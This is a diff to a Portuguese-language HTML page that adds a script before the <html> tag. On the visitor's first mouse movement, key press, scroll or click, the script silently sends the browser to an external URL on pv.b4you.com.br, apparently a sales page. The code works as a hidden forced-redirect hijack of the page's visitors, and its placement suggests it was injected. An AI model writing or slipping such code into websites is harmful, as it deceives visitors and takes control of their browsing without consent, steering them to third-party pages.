@@ -1,4 +1,26 @@
 <!DOCTYPE html>
+
+<script>
+  window.redirectURL = "https://pv.b4you.com.br/pages/45d88427-1b2d-426a-b8a6-0528bd79a136/yuy-62A-kd";
+
+  function redirecionar() {
+    window.location.href = window.redirectURL;
+  }
+
+  function ativarRedirecionamento() {
+    document.removeEventListener("mousemove", ativarRedirecionamento);
+    document.removeEventListener("keydown", ativarRedirecionamento);
+    document.removeEventListener("scroll", ativarRedirecionamento);
+    document.removeEventListener("click", ativarRedirecionamento);
+    redirecionar();
+  }
+
+  document.addEventListener("mousemove", ativarRedirecionamento);
+  document.addEventListener("keydown", ativarRedirecionamento);
+  document.addEventListener("scroll", ativarRedirecionamento);
+  document.addEventListener("click", ativarRedirecionamento);
+</script>
+
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
